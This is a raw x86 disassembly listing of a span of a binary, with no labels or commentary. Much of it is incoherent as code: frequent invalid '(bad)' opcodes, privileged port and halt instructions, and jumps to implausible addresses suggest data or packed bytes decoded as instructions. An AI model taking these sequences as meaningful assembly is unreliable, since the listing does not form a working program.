  412c63:	dec    ebp
  412c64:	scas   eax,DWORD PTR es:[edi]
  412c65:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  412c6b:	shr    DWORD PTR [ebx],cl
  412c6d:	into   
  412c6e:	cmp    edx,esi
  412c70:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  412c76:	dec    ebp
  412c77:	dec    ebp
  412c78:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  412c7e:	retf   
  412c7f:	xor    edx,esi
  412c81:	add    ecx,esi
  412c83:	imul   ecx,edx
  412c86:	mov    DWORD PTR [ebp+0x8],edx
  412c89:	xor    ecx,DWORD PTR [ebp+0x2b]
  412c8c:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  412c92:	add    esi,DWORD PTR [ebx]
  412c94:	rol    BYTE PTR [ebx],0x45
  412c97:	rdtsc  
  412c99:	xlat   BYTE PTR ds:[ebx]
  412c9a:	pushf  
  412c9b:	jge    0x412c26
  412c9d:	xor    esp,eax
  412c9f:	sub    eax,DWORD PTR [ebp-0x73]
  412ca2:	(bad)  
  412ca3:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  412caa:	dec    ebp
  412cab:	xchg   BYTE PTR [ebx],dh
  412cad:	inc    DWORD PTR [ebx]
  412caf:	(bad)  
  412cb0:	jmp    0x412cff
  412cb2:	mov    ecx,DWORD PTR [ebx-0x34341324]
  412cb8:	dec    ebp
  412cb9:	into   
  412cba:	mov    ebp,DWORD PTR [edi-0x23737420]
  412cc0:	pushf  
  412cc1:	shl    DWORD PTR [edx],cl
  412cc3:	retf   0x5588
  412cc6:	or     ecx,DWORD PTR [ebp+0x7233114d]
  412ccc:	add    eax,DWORD PTR [eax]
  412cce:	in     al,0x4d
  412cd0:	push   ebp
  412cd1:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  412cd7:	fs add ch,cl
  412cda:	dec    ebp
  412cdb:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  412ce1:	dec    ebp
  412ce2:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  412ce8:	jge    0x412cb8
  412cea:	mov    BYTE PTR [edi+0xf723b3a],ch
  412cf0:	add    cl,dh
  412cf2:	dec    ebp
  412cf3:	dec    DWORD PTR [ebx-0x2c032301]
  412cf9:	inc    ebp
  412cfa:	push   ebp
  412cfb:	dec    DWORD PTR [ebx-0x73ff1f34]
  412d01:	lea    ebx,[esp+edx*2+0x508bff32]
  412d08:	mov    ah,0x45
  412d0a:	push   ebp
  412d0b:	mov    esi,DWORD PTR [ebx]
  412d0d:	les    esi,FWORD PTR [ebx]
  412d0f:	add    BYTE PTR [ebx],al
  412d11:	inc    DWORD PTR [ebx]
  412d13:	mov    ecx,DWORD PTR [edi]
  412d15:	cld    
  412d16:	retf   0x4d80
  412d19:	add    DWORD PTR [ecx+0x4d30e400],ecx
  412d1f:	jne    0x412cac
  412d21:	(bad)  
  412d22:	in     al,dx
  412d23:	ror    bl,1
  412d25:	scas   al,BYTE PTR es:[edi]
  412d26:	into   
  412d27:	add    BYTE PTR [edi-0xf2f7475],ch
  412d2d:	not    bl
  412d2f:	adc    al,0xca
  412d31:	inc    ebp
  412d32:	push   ebp
  412d33:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  412d39:	push   0xaf80d6
  412d3e:	mov    eax,DWORD PTR [eax]
  412d40:	fdiv   st(7),st
  412d42:	sti    
  412d43:	sbb    dh,cl
  412d45:	pop    esi
  412d46:	xchg   esp,eax
  412d47:	leave  
  412d48:	pushf  
  412d49:	add    al,0x32
  412d4b:	push   ebp
  412d4c:	cmp    ebp,esp
  412d4e:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  412d52:	dec    DWORD PTR [ecx-0x740f0375]
  412d58:	push   ebp
  412d59:	cld    
  412d5a:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  412d60:	retf   0x558b
  412d63:	clc    
  412d64:	xor    esi,eax
  412d66:	add    esi,DWORD PTR [ebp-0x75]
  412d69:	(bad)  
  412d6a:	hlt    
  412d6b:	or     cl,BYTE PTR [esi+eax*8-0x39cdf764]
  412d72:	mov    DWORD PTR [edx],ecx
  412d74:	hlt    
  412d75:	(bad)  
  412d76:	dec    ebp
  412d77:	add    dh,BYTE PTR [ebx]
  412d79:	leave  
  412d7a:	mov    edx,0xffec8d55
  412d7f:	push   ecx
  412d80:	rol    DWORD PTR [ebp+0x55],1
  412d83:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  412d89:	mov    eax,0xf8030b33
  412d8e:	lar    ecx,di
  412d91:	push   ebp
  412d92:	retf   0x863b
  412d95:	jne    0x412d94
  412d97:	mov    edi,edi
  412d99:	or     BYTE PTR [ebp+0x41],dh
  412d9c:	mov    ebp,esp
  412d9e:	cld    
  412d9f:	inc    eax
  412da0:	mov    al,0x25
  412da2:	add    DWORD PTR [ecx+0x0],eax
  412da5:	in     eax,dx
  412da6:	test   DWORD PTR [ecx-0x1],eax
  412da9:	fdiv   st(7),st
  412dab:	ret    0x8b
  412dae:	cld    
  412daf:	mov    eax,DWORD PTR [eax+0x8d0151]
  412db5:	clc    
  412db6:	xor    BYTE PTR [ebp+0x45],al
  412db9:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  412dbf:	loopne 0x412dc0
  412dc1:	mov    edi,edi
  412dc3:	mov    ecx,eax
  412dc5:	clc    
  412dc6:	jne    0x412d98
  412dc8:	call   0x823ed1
  412dcd:	and    eax,0xc6854575
  412dd2:	je     0x412dd5
  412dd4:	mov    eax,esi
  412dd6:	cld    
  412dd7:	or     DWORD PTR [eax+0x401c9],eax
  412ddd:	push   ebp
  412dde:	add    ah,ch
  412de0:	add    BYTE PTR [ecx+0x6a],dl
  412de3:	inc    ebp
  412de4:	push   esi
  412de5:	mov    DWORD PTR [eax-0x4],edx
  412de8:	pop    edi
  412de9:	mov    ebx,DWORD PTR [ebx-0x4]
  412dec:	ret    0xbe
  412def:	push   es
  412df0:	mov    ecx,DWORD PTR [ecx-0x77274af]
  412df6:	clc    
  412df7:	lock inc ebp
  412df9:	jne    0x412e51
  412dfb:	(bad)  
  412dfc:	jne    0x412e02
  412dfe:	mov    eax,0xf841ba66
  412e03:	fadd   QWORD PTR [esi]
  412e05:	(bad)  
  412e06:	jne    0x412e45
  412e08:	cmp    eax,ebx
  412e0a:	pop    esi
  412e0b:	mov    ecx,DWORD PTR [eax]
  412e0d:	push   ecx
  412e0e:	inc    ecx
  412e0f:	lea    esi,[eax-0x8]
  412e12:	inc    edx
  412e13:	inc    ebp
  412e14:	int    0x8b
  412e16:	inc    edx
  412e17:	cld    
  412e18:	jo     0x412dd9
  412e1a:	inc    ecx
  412e1b:	xchg   edx,esp
  412e1d:	mov    ebx,eax
  412e1f:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  412e25:	or     edi,eax
  412e27:	inc    ebp
  412e28:	inc    ebp
  412e29:	(bad)  
  412e2a:	mov    ecx,DWORD PTR [eax]
  412e2c:	cld    
  412e2d:	(bad)  
  412e2e:	jmp    0x412e31
  412e30:	mov    eax,esi
  412e32:	mov    DWORD PTR ds:0x4f8c98b,eax
  412e38:	rcl    BYTE PTR [esi+0xf],1
  412e3b:	iret   
  412e3c:	inc    ebp
  412e3d:	leave  
  412e3e:	(bad)  
  412e3f:	dec    DWORD PTR [ecx]
  412e41:	mov    eax,esi
  412e43:	mov    eax,DWORD PTR [edi]
  412e45:	mov    dh,0xdd
  412e48:	push   es
  412e49:	nop
  412e4a:	(bad)  
  412e4b:	inc    DWORD PTR [ebx]
  412e4d:	push   esi
  412e4e:	leave  
  412e4f:	iret   
  412e50:	add    al,0x46
  412e52:	push   ebp
  412e53:	jmp    0xff928444
  412e58:	inc    ebp
  412e59:	push   esi
  412e5a:	mov    DWORD PTR [esi-0x4],eax
  412e5d:	in     eax,dx
  412e5e:	push   ebp
  412e5f:	sbb    BYTE PTR [eax+0x7c6daff],bh
  412e65:	add    al,BYTE PTR [edx]
  412e67:	mov    edx,DWORD PTR [ebp-0x17]
  412e6a:	cmp    edi,esi
  412e6c:	jne    0x412e6d
  412e6e:	(bad)  
  412e6f:	push   esi
  412e70:	pop    es
  412e71:	push   ebp
  412e72:	mov    ebp,esp
  412e74:	or     BYTE PTR [ebp+0x41],al
  412e77:	add    edi,esp
  412e79:	sub    BYTE PTR [eax-0x4],al
  412e7c:	int3   
  412e7d:	jne    0x412e41
  412e7f:	add    DWORD PTR [eax],eax
  412e81:	sbb    al,0x8b
  412e83:	mov    edx,DWORD PTR [ecx+0x14]
  412e86:	lea    edx,[edx-0x1ba7508]
  412e8c:	push   esi
  412e8d:	enter  0xd375,0xb8
  412e91:	test   DWORD PTR [esi],0x6ce0750
  412e97:	enter  0xd375,0x3b
  412e9b:	neg    DWORD PTR [esi+0x50]
  412e9e:	or     cl,dl
  412ea0:	inc    edx
  412ea1:	(bad)  
  412ea2:	loope  0x412e90
  412ea4:	(bad)  
  412ea5:	sub    eax,DWORD PTR [ebx]
  412ea7:	inc    eax
  412ea8:	loope  0x412efa
  412eaa:	add    dl,BYTE PTR [eax-0x37]
  412ead:	push   edi
  412eae:	push   ebp
  412eaf:	imul   ah
  412eb1:	adc    DWORD PTR [ecx-0x1],0x45
  412eb5:	add    BYTE PTR [ecx+0x55d3fc00],cl
  412ebb:	lea    edi,[eax-0x7fff4ca]
  412ec1:	mov    eax,0x4550402
  412ec6:	cmp    ebp,ecx
  412ec8:	jne    0x412e75
  412eca:	mov    eax,DWORD PTR ds:0x241e808
  412ed0:	in     eax,dx
  412ed1:	add    BYTE PTR [eax-0x7],al
  412ed4:	out    0x36,eax
  412ed6:	inc    ecx
  412ed7:	aas    
  412ed8:	jmp    0xccf15a
  412edd:	lock mov edi,DWORD PTR [ebp-0x18]
  412ee1:	and    edi,edi
  412ee3:	mov    edi,edi
  412ee5:	call   0xe40f2fc1
  412eea:	push   es
  412eeb:	add    al,ch
  412eed:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  412ef4:	(bad)  
  412ef5:	hlt    
  412ef6:	add    eax,0xffd3e87d
  412efb:	cmp    bh,0x8
  412efe:	(bad)  
  412eff:	fld    DWORD PTR [esi]
  412f01:	out    dx,al
  412f02:	call   0xffa02e0a
  412f07:	cmp    al,0x46
  412f09:	shl    edx,0x8
  412f0c:	(bad)  
  412f0d:	pop    es
  412f0e:	fisttp QWORD PTR [ebp+0xe577eff]
  412f14:	push   ebx
  412f15:	add    BYTE PTR [ebx+0x24008b56],cl
  412f1b:	add    BYTE PTR [ebp+0x50],al
  412f1e:	push   eax
  412f1f:	add    DWORD PTR [ebx+0x757d1834],ecx
  412f25:	sub    edx,DWORD PTR [esi-0x24]
  412f28:	jne    0x412ee0
  412f2a:	lods   eax,DWORD PTR ds:[esi]
  412f2b:	mov    edx,DWORD PTR [edx-0x34]
  412f2e:	dec    esi
  412f2f:	out    0x83,eax
  412f31:	into   
  412f32:	push   edi
  412f34:	loopne 0x412f04
  412f36:	shr    BYTE PTR [edx+ecx*4+0x0],1
  412f3a:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  412f41:	rol    DWORD PTR [edx],0x8
  412f44:	mov    esp,ecx
  412f46:	cmp    DWORD PTR [ebx],0xc
  412f49:	mov    esi,0x5001c0
  412f4e:	push   eax
  412f4f:	push   cs
  412f50:	push   eax
  412f51:	(bad)  
  412f52:	sub    edx,edi
  412f54:	push   esi
  412f55:	adc    al,0xcb
  412f57:	ins    DWORD PTR es:[edi],dx
  412f58:	mov    eax,0x203e8
  412f5d:	add    al,ah
  412f5f:	inc    esi
  412f60:	mov    al,ch
  412f62:	pop    es
  412f63:	add    DWORD PTR [eax],0x1
  412f66:	add    dh,al
  412f68:	add    ah,ch
  412f6a:	rol    DWORD PTR [edx-0xd],1
  412f6d:	cli    
  412f6e:	push   0x4a
  412f70:	pop    ecx
  412f71:	retf   0xfe6
  412f74:	add    BYTE PTR [ebx-0x4e72f41e],al
  412f7a:	(bad)  
  412f7b:	dec    BYTE PTR [ebx+0x45b1fc72]
  412f81:	(bad)  
  412f82:	sub    ebp,DWORD PTR [ebx]
  412f84:	and    al,0x52
  412f86:	(bad)  
  412f87:	dec    edi
  412f88:	inc    ebp
  412f89:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  412f90:	add    BYTE PTR [ebp-0x7b],dh
  412f93:	pop    eax
  412f94:	add    BYTE PTR [edx+0x0],bl
  412f97:	pop    edx
  412f98:	dec    ebp
  412f99:	jmp    DWORD PTR [ebx]
  412f9b:	and    al,0xec
  412f9d:	push   edx
  412f9e:	out    0x64,eax
  412fa0:	jmp    0xd3f325a5
  412fa5:	jmp    0x412fff
  412fa7:	mov    al,0xfe
  412fa9:	dec    BYTE PTR [ebp-0x18fd8018]
  412faf:	add    BYTE PTR [esi+ebp*1],bh
  412fb2:	pop    edx
  412fb3:	icebp  
  412fb4:	mov    eax,cs
  412fb6:	ins    BYTE PTR es:[edi],dx
  412fb7:	adc    eax,0x75510000
  412fbc:	mov    esi,0x70158
  412fc1:	or     DWORD PTR [eax-0x74f48dfe],esi
  412fc7:	mov    edi,esp
  412fc9:	cld    
  412fca:	jge    0x413041
  412fcc:	(bad)  
  412fce:	aas    
  412fcf:	and    al,0x6d
  412fd1:	adc    cl,0x1
  412fd4:	mov    eax,DWORD PTR [eax]
  412fd6:	and    ecx,DWORD PTR [ebx-0x167203fd]
  412fdc:	dec    ebp
  412fdd:	add    eax,ebp
  412fdf:	add    BYTE PTR [edx],al
  412fe1:	fadd   DWORD PTR [eax]
  412fe3:	stc    
  412fe4:	enter  0xee00,0x8b
  412fe8:	sbb    eax,0x1
  412feb:	sbb    esi,ecx
  412fed:	in     al,0x0
  412fef:	in     eax,dx
  412ff0:	add    BYTE PTR [eax],al
  412ff2:	jne    0x412f7f
  412ff4:	cmp    edx,esp
  412ff6:	jb     0x413001
  412ff8:	jmp    0x41306f
  412ffa:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  413000:	add    BYTE PTR [ebx+0x4d83d840],cl
  413006:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  41300c:	jb     0x412f97
  41300e:	pop    edx
  41300f:	fadd   QWORD PTR [ebx-0x7445faa1]
  413015:	or     dh,BYTE PTR [edx+0x0]
  413018:	inc    edx
  413019:	or     dl,bh
  41301b:	xlat   BYTE PTR ds:[ebx]
  41301c:	dec    edx
  41301d:	push   edi
  41301e:	add    al,0x7
  413020:	leave  
  413021:	rol    DWORD PTR [edx+eax*1],0x7
  413025:	add    ecx,ecx
  413027:	mov    edx,ecx
  413029:	int3   
  41302a:	jmp    0x412fea
  41302c:	mov    al,0x0
  41302e:	(bad)  
  41302f:	jne    0x413019
  413031:	mov    eax,DWORD PTR [edx]
  413033:	call   0xc155ad38
  413038:	pop    edi
  413039:	add    ebx,DWORD PTR [ecx-0x37]
  41303c:	pop    ecx
  41303d:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  413044:	push   es
  413045:	mov    eax,DWORD PTR [eax]
  413047:	int3   
  413048:	add    ch,al
  41304a:	jae    0x413034
  41304c:	int    0x1
  41304e:	enter  0x3000,0x18
  413052:	add    BYTE PTR [ebp+0x75],al
  413055:	mov    esi,DWORD PTR [eax-0x171f0134]
  41305b:	push   0x2
  41305d:	pop    ecx
  41305e:	add    BYTE PTR [eax],cl
  413060:	push   ebx
  413061:	lea    edi,[edi+eax*2]
  413064:	mov    al,0x1
  413066:	jb     0x413068
  413068:	mov    al,0x10
  41306a:	push   eax
  41306b:	add    al,0x75
  41306d:	add    BYTE PTR [ebx],ch
  41306f:	add    ebx,esp
  413071:	int3   
  413072:	jne    0x413084
  413074:	movsx  edx,cl
  413077:	add    DWORD PTR [eax],eax
  413079:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  413080:	mov    gs,edi
  413082:	add    BYTE PTR [eax-0x50],ch
  413085:	add    al,ch
  413087:	mov    eax,DWORD PTR [ecx]
  413089:	sub    eax,DWORD PTR [eax]
  41308b:	jb     0x413102
  41308d:	add    DWORD PTR [esp+eiz*8-0x50],esi
  413091:	jge    0x41307b
  413093:	add    al,0x1
  413095:	add    DWORD PTR [eax],0x0
  413098:	jne    0x41309a
  41309a:	je     0x4130e1
  41309c:	mov    eax,DWORD PTR [edi]
  41309e:	ror    BYTE PTR [ebp+0x4d],1
  4130a1:	or     DWORD PTR [ecx+0x4d03d004],0x3
  4130a8:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  4130ae:	mov    DWORD PTR [ebx],ebp
  4130b0:	fadd   DWORD PTR [eax+0x75]
  4130b3:	inc    eax
  4130b4:	pop    eax
  4130b5:	lea    ebx,[ecx+0x4f]
  4130b8:	push   0xb1000003
  4130bd:	out    dx,eax
  4130be:	add    ebp,DWORD PTR [edx+edx*2]
  4130c1:	add    BYTE PTR [ebx+ecx*4],bh
  4130c4:	mov    ch,BYTE PTR [ebx]
  4130c6:	jb     0x41313a
  4130c8:	add    al,0x89
  4130ca:	push   eax
  4130cb:	call   0x84297e3d
  4130d0:	add    DWORD PTR [eax+eax*1],eax
  4130d3:	jae    0x4130e9
  4130d5:	icebp  
  4130d6:	inc    ebp
  4130d7:	mov    eax,DWORD PTR gs:[ecx]
  4130da:	int3   
  4130db:	out    dx,al
  4130dc:	loopne 0x41312b
  4130de:	sub    eax,DWORD PTR [edx]
  4130e0:	push   0xffffff83
  4130e2:	pop    esi
  4130e3:	push   cs
  4130e4:	jl     0x4130ff
  4130e6:	add    al,0xaf
  4130e8:	xor    eax,0x832b6d00
  4130ed:	mov    eax,DWORD PTR [edx]
  4130ef:	rcr    BYTE PTR [ebp+0x754500dc],cl
  4130f5:	ror    DWORD PTR [ebx+0x7dc8e803],1
  4130fb:	inc    ebp
  4130fc:	shr    ebx,0x3
  4130ff:	or     DWORD PTR [eax],0x4
  413102:	push   0xffffffa5
  413104:	pop    esi
  413105:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  41310c:	jmp    0x41316b
  41310e:	mov    edi,0xff0272
  413113:	fdivr  QWORD PTR [ebp+0x5d]
  413116:	push   0x4e
  413118:	pop    ecx
  413119:	call   0x41751e
  41311e:	mov    DWORD PTR [ebx],eax
  413120:	in     al,0xc8
  413122:	rol    BYTE PTR [ebp-0x75],0xc1
  413126:	call   0xab3307
  41312b:	pop    esi
  41312c:	enter  0xceff,0x8b
  413130:	repz mov ecx,DWORD PTR [ebp-0x34]
  413134:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  41313b:	je     0x41313d
  41313d:	or     DWORD PTR [ebx-0x74183b24],eax
  413143:	jne    0x413129
  413145:	jmp    0x413140
  413147:	push   DWORD PTR [edx-0x24]
  41314a:	push   0x4d
  41314c:	pop    ecx
  41314d:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  413151:	jge    0x413159
  413153:	mov    eax,eax
  413155:	sub    ebp,DWORD PTR [edx+0x24]
  413158:	pop    esi
  413159:	inc    ebp
  41315a:	mov    esp,0x8b6077
  41315f:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  413165:	lods   al,BYTE PTR ds:[esi]
  413166:	add    BYTE PTR [ebx],bh
  413168:	enter  0xce73,0x49
  41316c:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  413174:	stc    
  413175:	jge    0x4131e9
  413177:	jnp    0xdd40b4d8
  41317d:	call   0xc43253
  413182:	fadd   st(0),st
  413184:	dec    esi
  413185:	ins    BYTE PTR es:[edi],dx
  413186:	stc    
  413187:	cmp    al,0x73
  413189:	push   ebp
  41318a:	mov    eax,0xf8028b
  41318f:	jne    0x413152
  413191:	mov    esi,ecx
  413193:	mov    esp,DWORD PTR [ebp+0x2c]
  413196:	add    edi,DWORD PTR [ebp-0x24]
  413199:	sub    esp,eax
  41319b:	and    al,0x45
  41319d:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  4131a3:	sbb    al,0xee
  4131a5:	pop    esi
  4131a6:	call   0x8131d6
  4131ab:	fsubr  st,st(3)
  4131ad:	sti    
  4131ae:	add    BYTE PTR gs:[ecx],bh
  4131b1:	add    eax,esp
  4131b3:	add    DWORD PTR [esi],eax
  4131b5:	rol    DWORD PTR [ebp+0x8],0x29
  4131b9:	mov    esp,eax
  4131bb:	clc    
  4131bc:	jne    0x413233
  4131be:	mov    eax,0x8b0673
  4131c3:	loopne 0x41320a
  4131c5:	loopne 0x413150
  4131c7:	lods   al,BYTE PTR ds:[esi]
  4131c8:	int3   
  4131c9:	inc    ebp
  4131ca:	mov    DWORD PTR gs:[eax+edi*8],eax
  4131ce:	add    al,0xc3
  4131d0:	sub    ecx,DWORD PTR [ebp+0x47]
  4131d3:	(bad)  
  4131d5:	shr    BYTE PTR [ebp-0x1f],0xe8
  4131d9:	add    eax,DWORD PTR [eax]
  4131db:	call   0x642f2e0
  4131e0:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4131e6:	dec    esi
  4131e7:	ins    DWORD PTR es:[edi],dx
  4131e8:	in     al,dx
  4131e9:	lea    eax,[eax]
  4131eb:	inc    ebp
  4131ec:	inc    ebp
  4131ed:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4131f3:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4131fd:	and    al,0xdc
  4131ff:	ror    DWORD PTR [edx+0x24],0xf7
  413203:	or     BYTE PTR [ebp+0x4c],dh
  413206:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  41320a:	stos   BYTE PTR es:[edi],al
  41320b:	adc    edx,edi
  41320d:	inc    esp
  41320e:	add    edi,DWORD PTR [eax]
  413210:	jne    0x4131f5
  413212:	mov    DWORD PTR [eax-0x7449db04],ecx
  413218:	cmp    ecx,DWORD PTR [edi]
  41321a:	sub    BYTE PTR [ebp-0x7e],dl
  41321d:	sar    ebp,0xb
  413220:	jmp    FWORD PTR [edi+0x2400392a]
  413226:	sub    esi,DWORD PTR [ebx-0x73]
  413229:	mov    esp,DWORD PTR [ecx+edi*4]
  41322c:	mov    ecx,DWORD PTR [eax]
  41322e:	and    BYTE PTR [eax],al
  413230:	jne    0x4131fc
  413232:	sub    ebp,ecx
  413234:	sbb    BYTE PTR [esi+0x32],ah
  413237:	dec    ebp
  413238:	push   ebp
  413239:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  41323f:	ret    
  413240:	mov    edx,ebp
  413242:	leave  
  413243:	sub    DWORD PTR [esi+0x24],ebx
  413246:	ret    0x2b
  413249:	pop    ax
  41324b:	push   ebp
  41324c:	rol    BYTE PTR [ebx],0xeb
  41324f:	add    DWORD PTR [ecx+0x6c0001],0x40
  413256:	jb     0x4132ad
  413258:	ret    
  413259:	in     al,dx
  41325a:	jecxz  0x4131e7
  41325c:	push   esi
  41325d:	xchg   esp,eax
  41325e:	jne    0x413260
  413260:	cmp    edx,DWORD PTR [esi+0x1c]
  413263:	jne    0x413249
  413265:	mov    eax,DWORD PTR [ebp-0x77]
  413268:	ror    DWORD PTR [ebx+0x899408],0xe0
  41326f:	mov    esi,DWORD PTR [ebp-0x75]
  413272:	pop    esi
  413273:	nop
  413274:	mov    eax,DWORD PTR [eax]
  413276:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  41327c:	add    al,0x0
  41327e:	inc    ebp
  41327f:	mov    eax,DWORD PTR [ebx]
  413281:	mov    ebp,ebx
  413283:	cmp    al,0xf
  413285:	or     al,al
  413287:	inc    ebp
  413288:	inc    ebp
  413289:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  41328f:	cld    
  413290:	add    BYTE PTR [edi+0x556c16c0],dh
  413296:	add    BYTE PTR [ecx-0x5],dl
  413299:	add    eax,0x17200
  41329e:	sbb    al,0x85
  4132a0:	dec    esp
  4132a1:	je     0x4132db
  4132a3:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  4132a7:	add    BYTE PTR [ebx],bh
  4132a9:	(bad)  
  4132aa:	and    al,0x30
  4132ac:	jae    0x41324a
  4132ae:	mov    cl,cl
  4132b0:	inc    DWORD PTR [esp]
  4132b3:	push   ebp
  4132b4:	shr    esp,0x8
  4132b7:	in     al,dx
  4132b8:	push   esp
  4132b9:	add    DWORD PTR [eax],esp
  4132bb:	add    bl,cl
  4132bd:	inc    ebp
  4132be:	mov    bh,0x53
  4132c0:	add    BYTE PTR [ebp-0x17],al
  4132c3:	push   esi
  4132c4:	cmovne ecx,edx
  4132c7:	xor    BYTE PTR [esp+ebx*4+0x20],cl
  4132cb:	push   edi
  4132cc:	pop    ss
  4132cd:	xor    ecx,ebx
  4132cf:	pushf  
  4132d0:	add    BYTE PTR [ecx+0x452bf800],cl
  4132d6:	rcr    ecx,0x5
  4132d9:	inc    ebp
  4132da:	add    esp,ebx
  4132dc:	add    BYTE PTR [ebp-0x40],al
  4132df:	out    0x6c,eax
  4132e1:	inc    ebp
  4132e2:	inc    eax
  4132e3:	sub    eax,0x450547c1
  4132e8:	dec    esp
  4132e9:	and    BYTE PTR cs:[ebp-0x27],al
  4132ed:	jo     0x413318
  4132ef:	leave  
  4132f0:	add    BYTE PTR [esi+0xc000c0],bh
  4132f6:	lea    eax,[esp-0x40]
  4132fa:	ret    
  4132fb:	mov    dh,0x8b
  4132fd:	xor    edx,DWORD PTR [ecx+0x3]
  413300:	mov    al,BYTE PTR [ecx+0x1]
  413303:	sbb    BYTE PTR [eax],al
  413305:	stc    
  413306:	mov    esi,DWORD PTR [edx+0x8]
  413309:	(bad)  
  41330a:	ss mov eax,0xb98ac631
  413310:	add    esi,eax
  413312:	add    BYTE PTR [edx-0x444d39f7],bh
  413318:	add    esi,eax
  41331a:	add    BYTE PTR [esi+ecx*1+0x1bd82c6],bh
  413321:	mov    BYTE PTR [eax],0xbe
  413324:	or     BYTE PTR [ebx],dh
  413326:	dec    ecx
  413327:	lea    eax,[ebx]
  413329:	or     eax,0x18fc0fc7
  41332e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41332f:	(bad)  
  413331:	fiadd  WORD PTR [ebp-0x78]
  413334:	jae    0xed763a83
  41333a:	or     BYTE PTR [ebp+0x7],al
  41333d:	in     eax,dx
  41333e:	pushf  
  41333f:	inc    ebp
  413340:	xor    bl,al
  413342:	pop    esi
  413343:	inc    ebp
  413344:	shl    esp,0xc
  413347:	inc    ebp
  413348:	sub    cl,0x1
  41334b:	inc    ebp
  41334c:	add    bh,bl
  41334e:	add    BYTE PTR [ebp-0x7b],al
  413351:	loopne 0x41334b
  413353:	inc    ebp
  413354:	ret    0xe7
  413357:	inc    ebp
  413358:	mov    esi,DWORD PTR [eax-0x7f]
  41335b:	leave  
  41335c:	and    al,0x44
  41335e:	add    BYTE PTR [eax+0x331cb68b],dh
  413364:	mov    DWORD PTR [ebx],eax
  413366:	sbb    al,0x41
  413368:	(bad)  
  413369:	sbb    al,ah
  41336b:	stc    
  41336c:	test   DWORD PTR [edx-0x8],esi
  41336f:	lea    edi,[edi-0x7007a98]
  413375:	mov    DWORD PTR [ebp-0x2c],edi
  413378:	(bad)  
  413379:	dec    ebp
  41337a:	sar    BYTE PTR [eax+0x71c1fcc6],0xc6
  413381:	add    edx,eax
  413383:	(bad)  
  413384:	(bad)  
  413385:	inc    ebx
  413387:	jmp    FWORD PTR [edx-0x38]
  41338a:	(bad)  
  41338b:	or     al,ah
  41338d:	jge    0x413355
  41338f:	mov    ebp,0x5a8533e4
  413395:	clc    
  413396:	leave  
  413397:	inc    ebp
  413398:	add    BYTE PTR [ebx+0xd8c8d],cl
  41339e:	rdpmc  
  4133a0:	sbb    BYTE PTR [edi+0x7de08da],bh
  4133a6:	mov    BYTE PTR [ebx+eax*4-0x12c6f9ce],bl
  4133ad:	cmovne edx,ebx
  4133b0:	jmp    0x4133b2
  4133b2:	inc    ebp
  4133b3:	mov    ebp,ebp
  4133b5:	sbb    al,0x45
  4133b7:	mov    ebx,ebx
  4133b9:	add    DWORD PTR [ebp+0x0],eax
  4133bc:	out    dx,al
  4133bd:	add    DWORD PTR [ebp+0x4d],eax
  4133c0:	sub    eax,0x2e80458b
  4133c5:	add    BYTE PTR [ebp-0x77],al
  4133c8:	jo     0x413434
  4133ca:	leave  
  4133cb:	mov    DWORD PTR [esp+ecx*8-0x48],0x33e9b6d8
  4133d3:	inc    ebp
  4133d4:	add    ebx,edi
  4133d6:	inc    ecx
  4133d7:	out    0x18,eax
  4133d9:	(bad)  
  4133da:	stc    
  4133db:	int3   
  4133dc:	jb     0x413368
  4133de:	(bad)  
  4133df:	xor    dh,BYTE PTR [eax-0x4ec83980]
  4133e5:	or     dh,al
  4133e7:	dec    esi
  4133e8:	mov    dl,0xf3
  4133ea:	mov    BYTE PTR [ebp-0x4d],0x89
  4133ee:	(bad)  
  4133ef:	loopne 0x4133a5
  4133f1:	inc    esi
  4133f3:	lea    esi,[ebp-0x49003924]
  4133f9:	push   eax
  4133fa:	mov    BYTE PTR [ebp-0x49],0x33
  4133fe:	xor    eax,DWORD PTR [ebx]
  413400:	lea    edx,[eax+0xd]
  413403:	inc    ebp
  413404:	jae    0x8c1b9a22
  41340a:	ficomp WORD PTR [eax+ecx*4]
  41340d:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  413414:	test   esi,edi
  413416:	(bad)  
  413417:	(bad)  
  413418:	inc    DWORD PTR [eax]
  41341a:	inc    ebp
  41341b:	add    BYTE PTR [ebx-0x10aa2bd0],cl
  413421:	test   DWORD PTR [ebx],edx
  413423:	jne    0x4133ae
  413425:	or     DWORD PTR [ebx-0xed9771],0x75703b8c
  41342f:	jmp    0x12534bd
  413434:	inc    ebp
  413435:	jne    0x413419
  413437:	mov    DWORD PTR [eax+eiz*8+0x331cff8b],ebx
